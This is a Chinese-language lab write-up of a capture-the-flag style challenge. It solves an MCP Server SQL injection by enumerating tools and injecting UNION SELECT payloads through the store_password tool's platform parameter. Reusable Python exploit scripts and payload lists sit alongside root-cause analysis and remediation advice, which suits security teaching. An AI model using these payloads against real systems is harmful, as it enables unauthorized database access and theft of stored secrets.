---
id: coae-appsec-f969c60c
title: 'MCP Server SQL 注入靶场完整解题记录'
aliases: []
domain:
  - 'AI应用与系统安全'
note_type:
  - lab
attack_phase:
  - inference
  - agent
status: draft
tags:
  - coae
  - ai-security
updated: 2026-08-17
---
# MCP Server SQL 注入靶场完整解题记录

> 适用范围：HTB Academy / 本地靶场 / 书面授权目标中的 MCP Server 安全测试复盘。本文记录的是授权实验流程，不适用于未授权系统。
>
> 关联笔记：
> - [MCP Server 常见漏洞安全测试清单](./MCP%20Server常见漏洞安全测试清单.md)
> - [恶意 MCP Server 攻击与安全测试清单](./恶意MCP%20Server攻击与安全测试清单.md)
> - [MCP 基础架构与安全测试清单](../AI与LLM基础/MCP基础架构与安全测试清单.md)

## 1. 题目目标

```text
Obtain the flag.
```

本题目标是连接目标 MCP Server，枚举其公开的 Resources、Resource Templates 和 Tools，定位可控参数，并通过 `store_password(password, platform)` 工具中的 SQL 注入读取数据库中的 `flag` 表。

核心攻击链：

```text
连接 MCP Server
  -> 枚举 Resources / Resource Templates / Tools
  -> 读取已存平台 rootlocker.htb
  -> 读取该平台密码 DummyPassword123
  -> 在 store_password 的 platform 参数中触发 SQL 报错
  -> 用 UNION SELECT 确认列数
  -> 用 @@version 判断数据库类型
  -> 枚举 information_schema.tables
  -> 找到 flag 表
  -> 枚举 flag 表字段
  -> UNION SELECT flag FROM flag
```

## 2. 环境与变量

靶场会动态分配目标地址，笔记不保存已经失效的临时实例地址，统一写为：

```text
http://STMIP:STMPO/mcp/
```

复现时把 `STMIP` 和 `STMPO` 替换为当前授权靶场提供的值：

```text
http://STMIP:STMPO/mcp/
```

依赖安装：

```bash
pip3 install fastmcp
```

## 2.1 核心技术点与利用模板

这题真正要复用的是 `Tool 参数 -> SQL 查询 -> UNION 回显` 的利用链。

```text
可控输入：store_password(password, platform) 的 platform
下游位置：疑似 WHERE platform = '<platform>' LIMIT 1
验证方式：platform = "rootlocker.htb'"
成功信号：MariaDB 语法错误，并泄露 LIMIT 1
利用方式：UNION SELECT 单列回显
```

最短可复用脚本：

```python
import asyncio
from fastmcp import Client, FastMCP

MCP_URL = "http://STMIP:STMPO/mcp/"
client = Client(MCP_URL)

async def call_platform(payload):
    result = await client.call_tool(
        "store_password",
        {"password": "DummyPassword123", "platform": payload},
    )
    print(result.content[0].text)

async def main():
    async with client:
        probes = [
            "rootlocker.htb'",
            "rootlocker.htb' UNION SELECT 1-- -",
            "roottlocker.htb' UNION SELECT @@version-- -",
            "roottlocker.htb' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -",
            'roottlocker.htb\' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = "flag"-- -',
            "roottlocker.htb' UNION SELECT flag FROM flag-- -",
        ]

        for p in probes:
            print(f"\n[+] {p}")
            try:
                await call_platform(p)
            except Exception as e:
                print(f"[-] {e}")

asyncio.run(main())
```

考试时替换点：

```text
[ ] MCP_URL
[ ] Tool 名称：store_password
[ ] 可控参数名：platform
[ ] 正常 password 参数
[ ] 已存在对象 rootlocker.htb
[ ] 不存在对象 roottlocker.htb
[ ] 目标表和字段：flag.flag
```

Python 客户端基础模板：

```python
import asyncio
from fastmcp import Client, FastMCP

client = Client("http://STMIP:STMPO/mcp/")

async def main():
    async with client:
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("Resources:")
        for resource in resources:
            print("***")
            print(resource.name)
            print(resource.description.strip())

        print("-" * 50)
        print("Resource Templates:")
        for resource_template in resource_templates:
            print("***")
            print(resource_template.uriTemplate)
            print(resource_template.description.strip())

        print("-" * 50)
        print("Tools:")
        for tool in tools:
            print("***")
            params = list(tool.inputSchema.get("properties").keys())
            print(f"{tool.name}({','.join(params)})")
            print(tool.description.strip())

asyncio.run(main())
```

## 3. 第一阶段：枚举 MCP 能力面

### 测试清单 MCP-SQLI-01：枚举 Resources

目标：确认 MCP Server 暴露了哪些只读资源。

操作：

```python
resources = await client.list_resources()
for resource in resources:
    print(resource.name)
    print(resource.description.strip())
```

观察结果：

```text
get_access_logs
Provides the MCP server access logs.

get_error_logs
Provides the MCP server error logs.

get_server_uptime
Get the server uptime.

count_files
Provides the number of stored files.

get_platforms
Provides a list of all stored platforms for which passwords are currently stored.
```

判断：

```text
[x] 存在与密码平台相关的资源：get_platforms
[x] 日志类资源也值得关注，但本题主线是密码存储功能
```

### 测试清单 MCP-SQLI-02：枚举 Resource Templates

目标：确认是否存在可带参数读取的资源模板。

操作：

```python
resource_templates = await client.list_resource_templates()
for resource_template in resource_templates:
    print(resource_template.uriTemplate)
    print(resource_template.description.strip())
```

观察结果：

```text
getfile://{file_name*}
Get content of a stored file.

password://{platform}
Fetch stored password for the specified platform

Keyword arguments:
platform -- the platform to fetch the password for
```

判断：

```text
[x] password://{platform} 可按平台名读取密码
[x] platform 是后续重点参数
```

### 测试清单 MCP-SQLI-03：枚举 Tools

目标：确认是否存在可写入、更新或影响下游数据库的工具。

操作：

```python
tools = await client.list_tools()
for tool in tools:
    params = list(tool.inputSchema.get("properties").keys())
    print(f"{tool.name}({','.join(params)})")
    print(tool.description.strip())
```

观察结果：

```text
store_file(file_content,file_name)
Store a file.

store_password(password,platform)
Store a password for the specified platform. If the platform already exists, the password will be updated.

Keyword arguments:
password -- the password
platform -- the platform corresponding to the password
```

判断：

```text
[x] store_password 是写入类 Tool
[x] platform 参数同时出现在读取模板和写入工具中
[x] “If the platform already exists, the password will be updated” 暗示底层可能先查后写
[x] 如果实现中拼接 SQL，platform 很可能进入 WHERE 查询条件
```

## 4. 第二阶段：建立正常业务基线

### 测试清单 MCP-SQLI-04：读取平台列表

目标：确认数据库中已有的 platform 值。

代码：

```python
try:
    result_object = await client.read_resource("resource://platforms")
    print(result_object[0].text)
except Exception as e:
    print(f"[-] {e}")
```

输出：

```text
["rootlocker.htb"]
```

结论：

```text
[x] 已知合法平台名：rootlocker.htb
[x] 后续读取 password://rootlocker.htb 可建立正常返回基线
```

### 测试清单 MCP-SQLI-05：读取已知平台密码

目标：确认 `password://{platform}` 的正常返回内容。

代码：

```python
try:
    result_object = await client.read_resource("password://rootlocker.htb")
    print(result_object[0].text)
except Exception as e:
    print(f"[-] {e}")
```

输出：

```text
DummyPassword123
```

结论：

```text
[x] rootlocker.htb 对应密码为 DummyPassword123
[x] 该值可作为后续调用 store_password 时的无害 password 参数
```

## 5. 第三阶段：确认 SQL 注入

### 测试清单 MCP-SQLI-06：单引号报错探测

目标：确认 `store_password` 的 `platform` 参数是否进入 SQL 查询。

代码：

```python
try:
    result_object = await client.call_tool(
        "store_password",
        {"password": "DummyPassword123", "platform": "rootlocker.htb'"}
    )
    print(result_object.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

输出：

```text
[-] Error calling tool 'store_password': 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''rootlocker.htb'' LIMIT 1' at line 1
```

判断：

```text
[x] 单引号破坏了 SQL 语法
[x] 报错信息泄露了数据库类型：MariaDB
[x] 报错片段暴露了查询尾部：'rootlocker.htb'' LIMIT 1
[x] platform 很可能被拼接进类似 WHERE platform = '<input>' LIMIT 1 的查询
```

风险点：

```text
该 Tool 是写入类能力。对真实平台名测试时可能触发更新逻辑。
后续注入建议改用不存在的平台名 roottlocker.htb，让原始查询返回空行，只显示 UNION 注入结果。
```

## 6. 第四阶段：UNION 注入枚举

### 测试清单 MCP-SQLI-07：确认 UNION 列数

目标：让 UNION 查询的列数与原始 SELECT 匹配。

代码：

```python
try:
    result_object = await client.call_tool(
        "store_password",
        {"password": "DummyPassword123", "platform": "rootlocker.htb' UNION SELECT 1-- -"}
    )
    print(result_object.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

输出：

```text
1
```

结论：

```text
[x] 原查询可用 1 列 UNION SELECT 匹配
[x] 后续 payload 只需要 SELECT 一个表达式
```

### 测试清单 MCP-SQLI-08：确认数据库类型和版本

目标：用数据库内置变量确认 DBMS 类型。

代码：

```python
try:
    result_object = await client.call_tool(
        "store_password",
        {"password": "DummyPassword123", "platform": "roottlocker.htb' UNION SELECT @@version-- -"}
    )
    print(result_object.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

观察：

```text
原文输出确认是 MySQL/MariaDB 相关数据库；前一步报错已明确显示 MariaDB。
```

为什么使用 `roottlocker.htb`：

```text
rootlocker.htb 是真实存在的平台。
roottlocker.htb 是故意写错的不存在平台。

如果原查询命中真实记录，LIMIT 1 可能优先返回原记录。
如果原查询不命中，UNION SELECT 产生的行更容易直接显示在结果中。
```

### 测试清单 MCP-SQLI-09：枚举表名

目标：通过 `information_schema.tables` 枚举数据库表，寻找 flag 相关表。

代码：

```python
try:
    result_object = await client.call_tool(
        "store_password",
        {
            "password": "DummyPassword123",
            "platform": "roottlocker.htb' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -",
        }
    )
    print(result_object.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

关键输出：

```text
...,flag,passwords
```

结论：

```text
[x] 数据库中存在 flag 表
[x] 同时存在 passwords 表，说明当前功能确实与密码存储数据库相关
```

### 测试清单 MCP-SQLI-10：枚举 flag 表字段

目标：确认 `flag` 表有哪些列，找到可读取字段。

代码：

```python
try:
    result_object = await client.call_tool(
        "store_password",
        {
            "password": "DummyPassword123",
            "platform": "roottlocker.htb' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name = \"flag\"-- -",
        }
    )
    print(result_object.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

输出：

```text
id,flag
```

结论：

```text
[x] flag 表有 id 和 flag 两列
[x] 目标字段为 flag
```

### 测试清单 MCP-SQLI-11：读取 flag

目标：读取 `flag.flag` 字段内容。

代码：

```python
try:
    result_object = await client.call_tool(
        "store_password",
        {"password": "DummyPassword123", "platform": "roottlocker.htb' UNION SELECT flag FROM flag-- -"}
    )
    print(result_object.content[0].text)
except Exception as e:
    print(f"[-] {e}")
```

输出：

```text
{hidden}
```

记录：

```text
Flag：{hidden}
```

原材料中 flag 被隐藏，因此这里严格记录为 `{hidden}`。复现真实靶场时，用实际输出替换该占位值。

## 7. 最终整合脚本

下面脚本把常用动作集中到一个文件中，复现时只需要替换 `MCP_URL`。

```python
import asyncio
from fastmcp import Client, FastMCP

MCP_URL = "http://STMIP:STMPO/mcp/"
client = Client(MCP_URL)


async def print_discovery():
    resources = await client.list_resources()
    resource_templates = await client.list_resource_templates()
    tools = await client.list_tools()

    print("Resources:")
    for resource in resources:
        print("***")
        print(resource.name)
        print(resource.description.strip())

    print("-" * 50)
    print("Resource Templates:")
    for resource_template in resource_templates:
        print("***")
        print(resource_template.uriTemplate)
        print(resource_template.description.strip())

    print("-" * 50)
    print("Tools:")
    for tool in tools:
        print("***")
        params = list(tool.inputSchema.get("properties").keys())
        print(f"{tool.name}({','.join(params)})")
        print(tool.description.strip())


async def read_resource(uri):
    result_object = await client.read_resource(uri)
    print(result_object[0].text)


async def call_store_password(platform, password="DummyPassword123"):
    result_object = await client.call_tool(
        "store_password",
        {"password": password, "platform": platform},
    )
    print(result_object.content[0].text)


async def main():
    async with client:
        await print_discovery()

        print("-" * 50)
        await read_resource("resource://platforms")
        await read_resource("password://rootlocker.htb")

        payloads = [
            "rootlocker.htb'",
            "rootlocker.htb' UNION SELECT 1-- -",
            "roottlocker.htb' UNION SELECT @@version-- -",
            "roottlocker.htb' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -",
            'roottlocker.htb\' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name = "flag"-- -',
            "roottlocker.htb' UNION SELECT flag FROM flag-- -",
        ]

        for payload in payloads:
            print("-" * 50)
            print(payload)
            try:
                await call_store_password(payload)
            except Exception as e:
                print(f"[-] {e}")


asyncio.run(main())
```

## 8. 复盘总结

### 漏洞根因

```text
[x] MCP Tool 的参数被传入下游数据库查询
[x] platform 参数缺少严格输入校验
[x] SQL 查询疑似使用字符串拼接
[x] 数据库错误被直接返回给客户端
[x] Tool 使用的数据库账号权限过高，可以读取 information_schema 和 flag 表
```

### 为什么这是 MCP Server 漏洞

```text
问题不在 LLM 是否会拒绝回答。
攻击者可以直接连接 MCP Server，并直接调用 list_resources、list_tools、read_resource、call_tool。

MCP Server 本质上是一个网络服务。
只要 Tool Handler 或 Resource Handler 的下游实现有注入、越权、路径穿越、SSRF 等问题，
这些问题就会暴露给任何能访问 MCP Server 的客户端。
```

### 防护建议

```text
[ ] 所有 SQL 使用参数化查询或 ORM 安全绑定
[ ] platform 只允许符合业务规则的域名/标识符格式
[ ] 错误信息对外返回通用错误，不返回 SQL 语句片段、DBMS 类型和驱动错误
[ ] MCP Transport 必须有认证，Token 需要绑定 audience、scope 和租户
[ ] Tool/Resource 做对象级授权，不能只依赖“客户端会正确调用”
[ ] 数据库账号最小权限，密码存储功能不应能读取 flag、information_schema 等无关表
[ ] 写入类 Tool 增加审计日志和幂等/确认机制
[ ] 对异常输入、引号、注释符、UNION、时间函数等建立回归测试
```

## 9. 之后遇到类似 MCP 题目的固定路线

```text
[ ] 1. 确认 MCP URL，注意路径通常是 /mcp/
[ ] 2. 安装或复用 fastmcp 客户端
[ ] 3. list_resources，记录资源名称和描述
[ ] 4. list_resource_templates，记录 URI 模板和参数
[ ] 5. list_tools，记录 Tool 名称、参数 schema、描述和副作用
[ ] 6. 先跑正常业务流，记录合法对象、正常输出、错误格式
[ ] 7. 对可控参数做低影响异常输入：单引号、双引号、超长、类型错误、不存在对象
[ ] 8. 如果出现 SQL 报错，先确认列数，再用不存在对象配合 UNION 显示注入结果
[ ] 9. 通过 @@version、information_schema.tables、information_schema.columns 枚举
[ ] 10. 读取目标表字段，记录证据和 payload
[ ] 11. 复盘根因：MCP 暴露面、Tool Handler、下游数据库、错误处理、权限边界
```

## 10. 证据记录模板

```text
题目：
目标 URL：
MCP Transport：
认证状态：

Resources：
-

Resource Templates：
-

Tools：
-

关键平台：
- rootlocker.htb

正常密码读取：
- password://rootlocker.htb -> DummyPassword123

SQL 注入参数：
- Tool：store_password
- 参数：platform

报错证据：
-

列数：
- 1

数据库类型：
- MariaDB / MySQL-compatible

表枚举：
- flag
- passwords

flag 表字段：
- id
- flag

最终 payload：
- roottlocker.htb' UNION SELECT flag FROM flag-- -

最终输出：
- {hidden}

修复建议：
- 参数化 SQL
- 输入校验
- 通用错误
- 最小权限
- Tool/Resource 级授权
```

## 11. 易错点

```text
[ ] 忘记 URL 末尾的 /mcp/
[ ] 把示例 IP:Port 当成固定地址，导致连接失败
[ ] 对真实 platform 反复调用写入类 Tool，意外更新数据
[ ] UNION SELECT 列数不匹配，误判为不可注入
[ ] 原查询命中 rootlocker.htb，导致看不到 UNION 行
[ ] 忘记使用不存在的平台名 roottlocker.htb
[ ] 注释符后缺少空格，导致 -- - 没有正确注释尾部 SQL
[ ] read_resource 的结果使用 result_object[0].text
[ ] call_tool 的结果使用 result_object.content[0].text
[ ] 看到 LLM/MCP 就只测提示词，忽略 MCP Server 是可直接调用的后端服务
```
